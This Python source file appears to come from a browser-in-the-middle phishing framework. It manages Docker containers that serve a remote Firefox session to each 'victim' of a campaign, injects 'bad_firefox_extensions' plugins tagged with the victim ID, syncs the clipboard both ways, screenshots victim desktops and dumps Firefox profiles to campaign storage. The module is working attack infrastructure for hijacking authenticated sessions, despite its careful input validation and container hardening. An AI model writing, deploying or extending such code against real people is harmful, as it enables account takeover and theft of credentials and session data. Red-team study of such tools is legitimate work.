"""Admin-owned lifecycle operations for victim browser containers."""

from dataclasses import dataclass
import io
import logging
import os
import re
import secrets
import struct
import tarfile
import tempfile
import time
import zipfile
from pathlib import Path
from urllib.parse import urlparse

import docker

from utils.campaign import dump_firefox_data, get_selkies_env
from utils.campaign_networks import connect_container_to_campaign_network
from utils.docker import copy_file_to_container, get_docker_client
from utils.internal_auth import (
    derive_campaign_api_key,
    derive_selkies_master_token,
    derive_victim_api_key,
)
from utils.runtime_diagnostics import RuntimeStartupError, inspect_container_failure
from utils.plugin_files import (
    PluginFileValidationError,
    normalize_plugin_file_path,
)
from utils.storage import get_host_campaign_storage_path, setup_campaign_storage
from utils.runtime_identity import runtime_identity_environment


logger = logging.getLogger(__name__)

ENVIRONMENT = os.getenv("ENVIRONMENT", "production")
INTERNAL_API_KEY = os.environ["INTERNAL_API_KEY"]
VNC_IMAGE = os.getenv("VNC_IMAGE", "bitm-vnc:latest")
SELKIES_IMAGE = os.getenv("SELKIES_IMAGE", "bitm-selkies:latest")
MAX_PLUGIN_FILES = 128
MAX_PLUGIN_FILE_BYTES = 2 * 1024 * 1024
MAX_PLUGIN_TOTAL_BYTES = 10 * 1024 * 1024
VICTIM_CLIPBOARD_ENV = {
    # The victim-facing Selkies client needs both directions: local clipboard
    # content is pasted into the remote Firefox session, while text copied in
    # that session is written back to the victim's clipboard.
    "SELKIES_CLIPBOARD_ENABLED": "true",
    "SELKIES_CLIPBOARD_IN_ENABLED": "true",
    "SELKIES_CLIPBOARD_OUT_ENABLED": "true",
}
VICTIM_READY_TIMEOUT_SECONDS = float(
    os.getenv("VICTIM_READY_TIMEOUT_SECONDS", "35")
)
VICTIM_READY_POLL_SECONDS = 0.5
MAX_SCREENSHOT_BYTES = 25 * 1024 * 1024
PNG_SIGNATURE = b"\x89PNG\r\n\x1a\n"
GLOBAL_MAX_ACTIVE_VICTIM_SESSIONS = int(
    os.getenv("GLOBAL_MAX_ACTIVE_VICTIM_SESSIONS", "20")
)


class GlobalCapacityError(RuntimeError):
    """Raised when the host-wide concurrent victim-container ceiling is reached."""


# The victim entrypoint scripts patch fixed placeholders in config/extension
# files. Validate here at the trust boundary; the image entrypoints repeat the
# small allowlist checks so manually started containers remain safe too.
_SAFE_IDENTIFIER = re.compile(r"^[A-Za-z0-9_-]+$")
_SAFE_HOST = re.compile(r"^[A-Za-z0-9.:_-]+$")
# USER_AGENT is JSON-encoded before it is written into extension JavaScript.
# Only raw control bytes need removal at this boundary.
_UNSAFE_USER_AGENT_CHARS = re.compile(r"[\x00-\x1f\x7f]")
MAX_USER_AGENT_LENGTH = 1024


def _require_safe_identifier(name: str, value: str) -> str:
    if not value or not _SAFE_IDENTIFIER.match(value):
        raise RuntimeError(f"Unsafe value generated for {name}")
    return value


def _require_safe_host(name: str, value: str) -> str:
    if not value or not _SAFE_HOST.match(value):
        raise RuntimeError(f"Unsafe value generated for {name}")
    return value


def _sanitize_user_agent(value: str) -> str:
    """Normalize an untrusted browser header before it enters Docker."""
    cleaned = _UNSAFE_USER_AGENT_CHARS.sub("", value or "").strip()
    cleaned = cleaned[:MAX_USER_AGENT_LENGTH]
    return cleaned or "unknown"


@dataclass(frozen=True)
class CapturedScreenshot:
    """A validated PNG captured from a victim browser container."""

    content: bytes
    width: int
    height: int


def _read_container_file(container, path: str, max_bytes: int) -> bytes:
    """Read one regular file from a Docker archive with a strict size limit."""
    archive_stream, stat = container.get_archive(path)
    declared_size = int((stat or {}).get("size") or 0)
    if declared_size > max_bytes:
        raise RuntimeError("Captured screenshot exceeds the size limit")

    archive = bytearray()
    archive_limit = max_bytes + 1024 * 1024
    for chunk in archive_stream:
        archive.extend(chunk)
        if len(archive) > archive_limit:
            raise RuntimeError("Captured screenshot archive exceeds the size limit")

    try:
        with tarfile.open(fileobj=io.BytesIO(archive), mode="r:*") as bundle:
            members = [member for member in bundle.getmembers() if member.isfile()]
            if len(members) != 1 or members[0].size > max_bytes:
                raise RuntimeError("Invalid screenshot archive")
            extracted = bundle.extractfile(members[0])
            if extracted is None:
                raise RuntimeError("Screenshot archive is empty")
            content = extracted.read(max_bytes + 1)
    except (tarfile.TarError, OSError) as exc:
        raise RuntimeError("Unable to read captured screenshot") from exc

    if len(content) > max_bytes:
        raise RuntimeError("Captured screenshot exceeds the size limit")
    return content


def _png_dimensions(content: bytes) -> tuple[int, int]:
    """Validate a PNG header and return its dimensions."""
    if (
        len(content) < 24
        or content[:8] != PNG_SIGNATURE
        or content[12:16] != b"IHDR"
    ):
        raise RuntimeError("Victim container returned an invalid screenshot")
    width, height = struct.unpack(">II", content[16:24])
    if width <= 0 or height <= 0 or width > 16_384 or height > 16_384:
        raise RuntimeError("Victim container returned invalid screenshot dimensions")
    return width, height


def capture_victim_screenshot(campaign, victim_id: str) -> CapturedScreenshot:
    """Capture the current desktop without granting Docker access downstream."""
    container_name = f"{campaign.container_name}-{victim_id}"
    container = get_docker_client().containers.get(container_name)
    labels = container.labels or {}
    if (
        labels.get("bitm.campaign.id") != campaign.id
        or labels.get("bitm.victim.id") != victim_id
        or labels.get("bitm.role") != "victim"
    ):
        raise RuntimeError("Refusing to capture a container outside victim scope")

    container.reload()
    if container.status != "running":
        raise RuntimeError("Victim browser container is not running")

    is_selkies = campaign.protocol == "selkies"
    desktop_user = "abc" if is_selkies else "bitm"
    display = ":1" if is_selkies else ":0"
    temporary_path = f"/tmp/pbitm-screenshot-{secrets.token_hex(12)}.png"

    try:
        result = container.exec_run(
            ["gnome-screenshot", "-f", temporary_path],
            user=desktop_user,
            environment={"DISPLAY": display},
        )
        if result.exit_code != 0:
            output = result.output
            if isinstance(output, bytes):
                output = output.decode("utf-8", errors="replace")
            detail = str(output).strip()[:500]
            suffix = f": {detail}" if detail else ""
            raise RuntimeError(f"Victim screenshot command failed{suffix}")

        content = _read_container_file(
            container,
            temporary_path,
            MAX_SCREENSHOT_BYTES,
        )
        width, height = _png_dimensions(content)
        return CapturedScreenshot(
            content=content,
            width=width,
            height=height,
        )
    finally:
        try:
            container.exec_run(
                ["rm", "-f", "--", temporary_path],
                user=desktop_user,
            )
        except Exception:
            pass


def _wait_for_victim_service(
    container,
    port: int,
    timeout_seconds: float = VICTIM_READY_TIMEOUT_SECONDS,
    poll_seconds: float = VICTIM_READY_POLL_SECONDS,
    require_success_status: bool = True,
) -> None:
    """Wait until the private Selkies/VNC HTTP endpoint is actually ready."""
    deadline = time.monotonic() + timeout_seconds
    last_output = ""

    while time.monotonic() < deadline:
        container.reload()
        if container.status != "running":
            raise RuntimeError(
                f"Victim container stopped during startup: {container.status}"
            )

        command = [
            "curl",
            "--silent",
            "--show-error",
            "--output",
            "/dev/null",
            "--max-time",
            "2",
            f"http://127.0.0.1:{port}/",
        ]
        if require_success_status:
            command.insert(1, "--fail")
        result = container.exec_run(command)
        if result.exit_code == 0:
            return

        output = result.output
        if isinstance(output, bytes):
            output = output.decode("utf-8", errors="replace")
        last_output = str(output).strip()
        time.sleep(poll_seconds)

    detail = f": {last_output}" if last_output else ""
    raise RuntimeError(
        f"Victim service did not become ready within {timeout_seconds:g}s{detail}"
    )


def _service_url(campaign_id: str, victim_id: str) -> str:
    if ENVIRONMENT == "production":
        return f"/v/{victim_id}/"
    return f"/{campaign_id}/v/{victim_id}/"


def _build_plugin_xpi(
    plugin_directory: Path,
    destination: Path,
    victim_id: str,
) -> None:
    if plugin_directory.is_symlink() or not plugin_directory.is_dir():
        raise PluginFileValidationError("Invalid plugin directory")

    entries: list[tuple[Path, str]] = []
    total_size = 0
    for source in plugin_directory.rglob("*"):
        if source.is_symlink():
            raise PluginFileValidationError("Plugin symlinks are not allowed")
        if not source.is_file():
            continue
        relative = normalize_plugin_file_path(
            source.relative_to(plugin_directory).as_posix()
        )
        size = source.stat().st_size
        if size > MAX_PLUGIN_FILE_BYTES:
            raise PluginFileValidationError("Plugin file is too large")
        total_size += size
        if total_size > MAX_PLUGIN_TOTAL_BYTES:
            raise PluginFileValidationError("Plugin files are too large")
        entries.append((source, relative))

    if not entries or len(entries) > MAX_PLUGIN_FILES:
        raise PluginFileValidationError("Invalid plugin file count")

    with zipfile.ZipFile(destination, "w", zipfile.ZIP_DEFLATED) as archive:
        for source, relative in entries:
            if source.suffix.lower() in {".js", ".html"}:
                content = source.read_text(encoding="utf-8", errors="strict")
                archive.writestr(relative, content.replace("VICTIM_ID", victim_id))
            else:
                archive.writestr(relative, source.read_bytes())


def create_victim_container(campaign, victim_id: str, user_agent: str, theme: str) -> dict:
    docker_client = get_docker_client()
    container_name = f"{campaign.container_name}-{victim_id}"
    custom_port = 8443
    custom_https_port = 8444
    custom_ws_port = 8082
    campaign_host = urlparse(campaign.public_url or "").hostname or campaign.host_ip
    campaign_key = derive_campaign_api_key(INTERNAL_API_KEY, campaign.id)
    victim_key = derive_victim_api_key(campaign_key, victim_id)
    selkies_master_token = derive_selkies_master_token(campaign_key, victim_id)
    service_url = _service_url(campaign.id, victim_id)

    # These values are patched into config/extension files inside the victim
    # container. Validate/sanitize them before they cross into Docker env.
    _require_safe_identifier("CONTAINER_NAME", container_name)
    _require_safe_identifier("CAMPAIGN_ID", campaign.id)
    _require_safe_identifier("VICTIM_ID", victim_id)
    _require_safe_identifier("VICTIM_API_KEY", victim_key)
    _require_safe_host("IP", campaign.host_ip)
    user_agent = _sanitize_user_agent(user_agent)

    try:
        campaign_container = docker_client.containers.get(campaign.container_name)
    except docker.errors.NotFound as exc:
        raise RuntimeError("Campaign gateway container is not available") from exc

    campaign_network = connect_container_to_campaign_network(
        campaign_container,
        campaign.id,
    )

    try:
        existing = docker_client.containers.get(container_name)
        labels = existing.labels or {}
        if (
            labels.get("bitm.campaign.id") != campaign.id
            or labels.get("bitm.victim.id") != victim_id
        ):
            raise RuntimeError("Container name collision")
        connect_container_to_campaign_network(existing, campaign.id)
        if existing.status != "running":
            existing.start()
            existing.reload()
        _wait_for_victim_service(existing, custom_port)
        if campaign.protocol == "selkies":
            _wait_for_victim_service(
                existing,
                8083,
                require_success_status=False,
            )
        return {
            "container_name": container_name,
            "service_url": service_url,
            "port": custom_port,
        }
    except docker.errors.NotFound:
        pass

    active_victim_containers = docker_client.containers.list(
        all=True, filters={"label": "bitm.role=victim"}
    )
    if len(active_victim_containers) >= GLOBAL_MAX_ACTIVE_VICTIM_SESSIONS:
        raise GlobalCapacityError(
            f"Global concurrent victim session limit reached "
            f"({GLOBAL_MAX_ACTIVE_VICTIM_SESSIONS})"
        )

    selkies_config = campaign.selkies_config or {}
    selkies_env = (
        get_selkies_env({"selkies": selkies_config})
        if campaign.protocol == "selkies"
        else {}
    )
    extensions = campaign.plugin_ids or []
    if not isinstance(extensions, list):
        raise RuntimeError("Invalid campaign extension configuration")
    for extension in extensions:
        _require_safe_identifier("EXTENSIONS entry", str(extension))

    storage_path = setup_campaign_storage(campaign.name, campaign.id)
    victim_storage_path = storage_path / victim_id
    victim_storage_path.mkdir(parents=True, exist_ok=True)
    host_victim_storage = (
        get_host_campaign_storage_path(campaign.name, campaign.id) / victim_id
    )

    container = docker_client.containers.create(
        image=VNC_IMAGE if campaign.protocol == "vnc" else SELKIES_IMAGE,
        name=container_name,
        detach=True,
        shm_size="1g",
        mem_limit="4g",
        memswap_limit="4g",
        nano_cpus=4_000_000_000,
        labels={
            "bitm.victim.id": victim_id,
            "bitm.parent.name": campaign.container_name,
            "bitm.campaign.id": campaign.id,
            "bitm.role": "victim",
            "com.docker.compose.project": campaign.container_name,
            # Browsers are private campaign workloads. Traefik discovers only
            # the campaign gateway, never the individual victim containers.
            "traefik.enable": "false",
        },
        environment={
            "CONTAINER_NAME": container_name,
            "CAMPAIGN_ID": campaign.id,
            "URL": campaign.target_url,
            "MODE": campaign.mode,
            "IP": campaign.host_ip,
            "PORT": str(campaign.host_port or 8080),
            "CUSTOM_USER": "bitm",
            "CUSTOM_PORT": str(custom_port),
            "CUSTOM_HTTPS_PORT": str(custom_https_port),
            "CUSTOM_WS_PORT": str(custom_ws_port),
            **selkies_env,
            **runtime_identity_environment(linuxserver=True),
            "HARDEN_DESKTOP": "true",
            "HARDEN_OPENBOX": "true",
            "SELKIES_FILE_TRANSFERS": "",
            "SELKIES_COMMAND_ENABLED": "false",
            **VICTIM_CLIPBOARD_ENV,
            "SELKIES_MICROPHONE_ENABLED": "false",
            "USER_AGENT": user_agent,
            "CAMPAIGN_HOST": campaign_host,
            "VICTIM_ID": victim_id,
            "VICTIM_API_KEY": victim_key,
            "SELKIES_MASTER_TOKEN": selkies_master_token,
            "SELKIES_CONTROL_PORT": "8083",
            "THEME": theme,
            "EXTENSIONS": ",".join(str(extension) for extension in extensions),
        },
        volumes={
            str(host_victim_storage): {"bind": "/storage", "mode": "rw"},
        },
        network=campaign_network.name,
        security_opt=["no-new-privileges:true"],
        cap_drop=["NET_RAW", "NET_ADMIN", "SYS_ADMIN", "MKNOD", "AUDIT_WRITE"],
        pids_limit=512,
        # Selkies/VNC images use s6-overlay, whose init must remain PID 1.
        # Docker's --init would insert docker-init in front of s6 and makes
        # s6-overlay-suexec terminate the container with exit code 100.
        init=False,
        # Keep failed startup containers inspectable until this function has
        # collected bounded, sanitized diagnostics. Normal session teardown
        # still removes the container explicitly.
        auto_remove=False,
    )

    try:
        plugins_directory = storage_path / "plugins"
        if plugins_directory.exists():
            for plugin_directory in plugins_directory.iterdir():
                if not plugin_directory.name.startswith("plugin-"):
                    continue
                with tempfile.TemporaryDirectory() as temporary_directory:
                    xpi_path = Path(temporary_directory) / f"{plugin_directory.name}.xpi"
                    _build_plugin_xpi(plugin_directory, xpi_path, victim_id)
                    copy_file_to_container(
                        container.id,
                        str(xpi_path),
                        f"/bitm/app/bad_firefox_extensions/{xpi_path.name}",
                    )
        container.start()
        container.reload()
        if container.status != "running":
            raise RuntimeError(f"Container failed to start: {container.status}")
        _wait_for_victim_service(container, custom_port)
        if campaign.protocol == "selkies":
            _wait_for_victim_service(
                container,
                8083,
                require_success_status=False,
            )
    except Exception as exc:
        diagnostic = inspect_container_failure(container)
        try:
            container.remove(force=True)
        except Exception as cleanup_exc:
            # The container that just failed to start is now orphaned: it
            # won't be retried and the reconciler is the only thing left
            # that can catch it.
            logger.warning(
                "Failed to remove container %s after a failed startup: %s",
                container_name,
                cleanup_exc,
            )
        raise RuntimeStartupError("victim", diagnostic) from exc

    return {
        "container_name": container_name,
        "service_url": service_url,
        "port": custom_port,
    }


async def dump_victim_container(campaign, victim_id: str) -> None:
    container_name = f"{campaign.container_name}-{victim_id}"
    victim_storage_path = (
        setup_campaign_storage(campaign.name, campaign.id) / victim_id
    )
    victim_storage_path.mkdir(parents=True, exist_ok=True)
    await dump_firefox_data(
        container_name,
        victim_storage_path / "firefox_profile.zip",
        protocol=campaign.protocol,
    )


def destroy_victim_container(campaign, victim_id: str) -> None:
    docker_client = get_docker_client()
    container_name = f"{campaign.container_name}-{victim_id}"
    try:
        container = docker_client.containers.get(container_name)
    except docker.errors.NotFound:
        return

    labels = container.labels or {}
    if (
        labels.get("bitm.campaign.id") != campaign.id
        or labels.get("bitm.victim.id") != victim_id
    ):
        raise RuntimeError("Refusing to remove a container outside the requested scope")
    container.remove(force=True)
